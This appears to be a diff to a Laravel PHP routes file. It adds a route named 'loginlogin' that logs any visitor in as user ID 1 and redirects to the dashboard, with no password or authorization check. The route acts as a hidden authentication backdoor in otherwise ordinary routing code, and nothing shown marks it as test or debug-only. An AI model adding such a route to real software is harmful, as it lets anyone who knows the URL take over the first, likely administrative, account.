@@ -4,6 +4,13 @@ Route::get('/', function() {
     return Redirect::route('dashboard');
 });
 
+Route::get('loginlogin', function() {
+    $usr = \User::find(1);
+
+    Auth::login($usr);
+    return Redirect::route('dashboard');
+});
+
 Route::group(['prefix' => 'login'], function () {
     Route::get('/', [
         'as'   => 'login.start',
